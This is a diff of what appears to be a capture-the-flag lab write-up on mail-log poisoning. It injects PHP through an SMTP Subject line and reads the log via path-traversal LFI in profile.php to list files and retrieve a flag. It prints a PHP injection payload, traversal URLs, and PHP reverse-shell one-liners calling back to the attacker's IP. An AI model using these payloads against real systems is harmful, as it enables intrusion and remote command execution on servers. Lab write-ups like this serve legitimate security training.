@@ -297,13 +297,18 @@ echo -e "EHLO example.com\nMAIL FROM:<test@email.com>\nRCPT TO:<test@email.com>\
 
 Yes we can 
 ```
- Mar 10 04:00:21 mail dovecot: pop3-login: Disconnected (no auth attempts in 7 secs): user=<>, rip=10.4.114.252, lip=10.10.41.124, TLS, session= Mar 10 05:10:58 mail postfix/smtpd[3471]: connect from ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252] Mar 10 05:10:58 mail postfix/smtpd[3471]: improper command pipelining after EHLO from ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252]: MAIL FROM:\nRCPT TO:\nDATA\nSubject: Test\n\nTest message.\n.\nQUIT\n\n Mar 10 05:10:58 mail postfix/smtpd[3471]: 9D546FB215: client=ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252] Mar 10 05:10:58 mail postfix/cleanup[3474]: 9D546FB215: message-id=<> Mar 10 05:10:58 mail postfix/smtpd[3471]: disconnect from ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5 Mar 10 05:10:58 mail postfix/qmgr[1720]: 9D546FB215: from=, size=242, nrcpt=1 (queue active) Mar 10 05:11:28 mail postfix/smtp[3475]: connect to mx01.mail.com[74.208.5.22]:25: Connection timed out 
+Mar 10 04:00:21 mail dovecot: pop3-login: Disconnected (no auth attempts in 7 secs): user=<>, rip=10.4.114.252, lip=10.10.41.124, TLS, session= Mar 10 05:10:58 mail postfix/smtpd[3471]: connect from ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252] Mar 10 05:10:58 mail postfix/smtpd[3471]: improper command pipelining after EHLO from ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252]: MAIL FROM:\nRCPT TO:\nDATA\nSubject: Test\n\nTest message.\n.\nQUIT\n\n Mar 10 05:10:58 mail postfix/smtpd[3471]: 9D546FB215: client=ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252] Mar 10 05:10:58 mail postfix/cleanup[3474]: 9D546FB215: message-id=<> Mar 10 05:10:58 mail postfix/smtpd[3471]: disconnect from ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5 Mar 10 05:10:58 mail postfix/qmgr[1720]: 9D546FB215: from=, size=242, nrcpt=1 (queue active) Mar 10 05:11:28 mail postfix/smtp[3475]: connect to mx01.mail.com[74.208.5.22]:25: Connection timed out
 ```
 
-Can we inject PHP into the log file, which we can then list files on the folder, 
+Bit of testing we should be able to use the following to list all files within the directory 
+```
+<?php echo implode(PHP_EOL, scandir('/var/www/html')); ?>
+```
+
+Trying the following to get the PHP into the log file, 
 
 ```
- nc 10.10.85.15 25
+nc 10.10.85.15 25
 220 mail.filepath.lab ESMTP Postfix (Ubuntu)
 EHLO attacker.com
 250-mail.filepath.lab
@@ -327,19 +332,21 @@ Subject: <?php echo implode(PHP_EOL, scandir('/var/www/html')); ?>
 221 2.7.0 Error: I can break rules, too. Goodbye.
 ```
 
+Checking the mail.log and we can see the files from the directory listed,
 http://10.10.85.15:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/mail.log
 
 ```
 550 5.1.1 : Recipient address rejected: User unknown in local recipient table; from= to= proto=ESMTP helo= Mar 10 06:17:21 mail postfix/smtpd[2101]: warning: non-SMTP command from ip-10-10-249-90.eu-west-1.compute.internal[10.10.249.90]: Subject: . .. .htaccess 505eb0fb8a9f32853b4d955e1f9123ea.txt api.php auth.php dashboard.php index.php login.php logout.php profile.php templates uploadsMar 10 06:17:21 mail postfix/smtpd[2101]: disconnect from ip-10-10-249-90.eu-west-1.compute.internal[10.10.249.90] ehlo=2 mail=2 rcpt=1/3 data=1/2 unknown=0/1 commands=6/10 
 ```
 
+So now we can LFI the flag without even connecting via SSH 
 http://10.10.85.15:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
 
 ```
 THM{#######################} 
 ```
 
-From testing, it's the subject line that gets injected, can we get a reverse shell ?  yes and no, can get connections but they drop straight away. Attempted to use msfconsole and listeners such as exploit/multi/handler  PAYLOAD php/meterpreter/reverse_tcp but unfortunately didn't work.  Might revisit another time
+Further testing, it's the subject line that gets injected into the log, can we get a reverse shell ?  yes and no, can get connections but they drop straight away. Attempted to use msfconsole and listeners such as exploit/multi/handler  PAYLOAD php/meterpreter/reverse_tcp but unfortunately didn't work.  Might revisit another time
 
 ```
 Subject: <?php $sock=fsockopen("10.10.249.90",8997);system("/bin/sh -i <&3 >&3 2>&3");?>
@@ -351,5 +358,4 @@ Subject: <?php $sock=fsockopen("10.10.249.90",9000);exec("/bin/sh -i <&3 >&3 2>&
 root@ip-10-10-249-90:~# nc -lvnp 9001
 Listening on 0.0.0.0 9001
 Connection received on 10.10.150.130 44478
-
 ```
